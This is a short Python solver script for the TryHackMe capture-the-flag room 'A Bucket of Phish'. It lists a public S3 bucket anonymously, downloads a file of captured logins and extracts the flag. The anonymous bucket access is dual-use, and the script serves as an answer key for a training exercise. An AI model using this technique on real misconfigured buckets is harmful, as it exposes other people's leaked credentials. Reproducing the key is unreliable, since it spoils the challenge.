# a_bucket_of_phish_solver.py – Real Execution Solver for TryHackMe: A Bucket of Phish
# OMN1_CTFPRO Module by mgledev

import subprocess
import time
import os

def run_command(cmd, delay=1.0):
    print(f"$ {cmd}")
    try:
        result = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(e.output)
    time.sleep(delay)

def solve_a_bucket_of_phish():
    print("[*] Connecting to public AWS S3 bucket: s3://darkinjector-phish\n")
    time.sleep(1)

    # Step 1: List files in the bucket
    run_command("aws s3 ls s3://darkinjector-phish --region us-west-2 --no-sign-request")

    # Step 2: Download the file
    filename = "captured-logins-093582390"
    print(f"[*] Downloading file: {filename}")
    run_command(f"aws s3 cp s3://darkinjector-phish/{filename} . --region us-west-2 --no-sign-request")

    # Step 3: Read and parse the file
    print(f"[*] Reading file: {filename}\n")
    time.sleep(1)
    try:
        with open(filename, "r") as f:
            lines = f.readlines()
            for line in lines:
                print(line.strip())
                if "THM{" in line:
                    flag = line.split(",")[1].strip()
                    print(f"\n[✔] Flag found: {flag}")
                    return flag
    except FileNotFoundError:
        print(f"[!] File '{filename}' not found.")
        return None
